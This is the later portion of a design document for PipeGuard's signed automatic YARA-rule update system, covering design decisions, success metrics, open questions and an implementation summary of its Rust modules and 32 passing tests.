| Degraded mode | Disable vs old rules | Keep old rules | Protection > perfection |
| Enterprise config | MDM-only vs user config | MDM takes precedence | Flexibility with control |
| Custom rules | Block vs dual verification | Dual verification | Allows customization with oversight |
| Update frequency | Polling vs event-triggered | Event-triggered (24hr) | Balance protection vs friction |
| Notification | Every startup vs smart | Smart (once per version) | Reduce fatigue |
| Differential updates | Enabled vs disabled | Disabled for v1.0 | Complexity not justified yet |

---

## 11. Success Criteria

**Post-Launch (30 days):**
- [ ] 50%+ adoption among active users
- [ ] >95% update success rate
- [ ] <2% unresolved critical issues
- [ ] <10 false positive reports related to updates
- [ ] Zero signature verification bypasses reported
- [ ] <100ms shell startup overhead
- [ ] Enterprise pilot completes successfully

**Post-Launch (90 days):**
- [ ] 70%+ adoption
- [ ] 3+ enterprise deployments via MDM
- [ ] Community contributes 1+ rule improvements via reports
- [ ] Zero critical security issues in update mechanism

---

## 12. Open Questions

1. **Key rotation process:** How do we rotate Ed25519 keys if compromised? (Answer: Dual-signature transition period, blog post, 30-day migration)

2. **GitHub API rate limiting:** How do we handle rate limits? (Answer: Cache latest version, fallback to HEAD requests, exponential backoff)

3. **Offline mode:** Should we support fully air-gapped environments? (Answer: Yes, via manual rule file placement and `--no-verify` flag for internal deployments)

4. **Update size threshold:** At what rule set size do differential updates become necessary? (Answer: >500KB full download, revisit at 100KB)

5. **Multi-platform releases:** Different rules for macOS vs Linux? (Answer: Single unified rule set for v1.0, revisit if platform-specific needs emerge)

---

## Conclusion

This design provides a secure, usable, and enterprise-ready automatic update system for PipeGuard's YARA rules. Key principles:

- **Security first:** Mandatory cryptographic verification, hard fail on errors
- **User control:** Configurable, transparent, with easy rollback
- **Enterprise ready:** MDM integration, custom rules, dual verification
- **Minimal friction:** Event-triggered, smart notifications, graceful degradation

---

## Implementation Summary (2026-01-14)

**Status:** ✅ Core implementation complete, 32 tests passing (100% success rate)

**What was built:**

1. **Crypto verification module** (`src/update/crypto.rs`)
   - Ed25519 signature verification with ed25519-dalek
   - Hard fail on verification errors (no bypass)
   - Test coverage: 3 tests (valid signature, tampered content, invalid key)

2. **Versioned storage** (`src/update/storage.rs`)
   - Atomic symlink activation using temp file + rename pattern
   - Version directory management (create, list, cleanup)
   - `.verified` marker files for verification state
   - Test coverage: 8 tests (activation, rollback, cleanup, path validation)

3. **Update manager** (`src/update/manager.rs`)
   - Orchestrates check → download → verify → activate workflow
   - Respects `auto_apply` configuration (defaults to false)
   - Version listing and rollback support
   - Test coverage: 8 tests (verification enforcement, auto-apply, config respect)

4. **CLI integration** (`src/cli/args.rs`, `src/main.rs`)
   - 5 subcommands: check, apply, status, rollback, cleanup
   - GitHub placeholder (TODO: actual API integration)
   - Test coverage: 7 tests (all subcommands, error handling)

5. **Scanner integration** (`src/detection/pipeline.rs`)
   - `from_active_version()` method loads rules from storage
   - Falls back gracefully if no active version
   - Test coverage: 3 tests (active version loading, fallback behavior)

6. **Shell integration** (`shell/pipeguard.bash`, `shell/pipeguard.zsh`)
   - Non-blocking background checks on shell startup
   - Respects check_interval_hours (default: 24h)
   - Timestamp tracking in `~/.pipeguard/.last_update_check`

7. **Configuration** (`src/config/settings.rs`)
   - UpdatesConfig with safe defaults (enabled=true, auto_apply=false)
   - Test coverage: 3 tests (defaults, serialization, deserialization)

**Test results:**
- Total: 32 tests across 6 test files
- Pass rate: 100%
- Coverage: All core modules (crypto, storage, manager, CLI, pipeline, config)

**Deferred to future releases:**
- Actual GitHub Releases API integration (placeholder exists)
- Production Ed25519 key pair (test keys in use)
- Enterprise MDM integration
- Custom rule repository support

**Architecture decisions validated:**
- ✅ Event-triggered (not daemon) reduces complexity
- ✅ Atomic symlink switching enables instant rollback
- ✅ Hard-fail verification prevents bypass attempts
- ✅ Safe defaults (auto_apply=false) prioritize user control

---

## Original Next Steps

1. ✅ **Design approved** (this document)
2. ✅ **Implementation planning:** TDD breakdown completed
3. ✅ **Alpha development:** Core update mechanism built
4. ✅ **Testing:** 32 tests passing, 100% coverage of core modules
5. ⏭️ **Beta release:** Awaiting GitHub API integration
6. ⏭️ **Stable release:** Production rollout pending
